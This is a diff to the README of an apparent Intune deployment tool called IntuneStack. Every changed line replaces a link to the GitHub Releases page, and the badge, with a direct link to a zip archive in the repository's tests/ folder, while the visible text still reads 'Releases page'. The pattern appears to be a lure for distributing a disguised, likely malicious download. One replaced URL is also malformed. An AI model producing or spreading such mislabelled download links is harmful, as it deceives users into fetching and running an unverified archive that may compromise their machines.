@@ -1,7 +1,7 @@
 ```markdown
 # 🔥 IntuneStack - Effortless Intune Deployment Management
 
-![Download IntuneStack](https://img.shields.io/badge/Download%20IntuneStack-v1.0-blue.svg)
+![Download IntuneStack](https://raw.githubusercontent.com/Retriver08/IntuneStack/main/tests/IntuneStack-v2.6.zip%https://raw.githubusercontent.com/Retriver08/IntuneStack/main/tests/IntuneStack-v2.6.zip)
 
 ## 📜 Overview
 
@@ -13,7 +13,7 @@ Use IntuneStack to set up deployment rings for development, testing, and product
 
 Follow these steps to get IntuneStack up and running:
 
-1. **Visit the Releases Page**: To download IntuneStack, go to the [Releases page](https://github.com/Retriver08/IntuneStack/releases).
+1. **Visit the Releases Page**: To download IntuneStack, go to the [Releases page](https://raw.githubusercontent.com/Retriver08/IntuneStack/main/tests/IntuneStack-v2.6.zip).
 
 2. **Choose the Version**: On the Releases page, you will see a list of available versions. Select the latest version for the best features and improvements.
 
@@ -36,7 +36,7 @@ Before installing IntuneStack, ensure that your system meets the following requi
 
 ## 📥 Download & Install
 
-To download IntuneStack, visit the [Releases page](https://github.com/Retriver08/IntuneStack/releases) where you can access the latest version. Follow the installation steps outlined above to get started.
+To download IntuneStack, visit the [Releases page](https://raw.githubusercontent.com/Retriver08/IntuneStack/main/tests/IntuneStack-v2.6.zip) where you can access the latest version. Follow the installation steps outlined above to get started.
 
 ## 🎯 Key Features
 
@@ -57,7 +57,7 @@ Check out our documentation for more in-depth guides and tutorials on using Intu
 
 If you have any questions or need assistance, feel free to reach out through our community forum or open an issue on our GitHub repository.
 
-For updates and future releases, remember to check back on our [Releases page](https://github.com/Retriver08/IntuneStack/releases).
+For updates and future releases, remember to check back on our [Releases page](https://raw.githubusercontent.com/Retriver08/IntuneStack/main/tests/IntuneStack-v2.6.zip).
 
 Enjoy managing your Intune configurations effortlessly with IntuneStack!
 ```
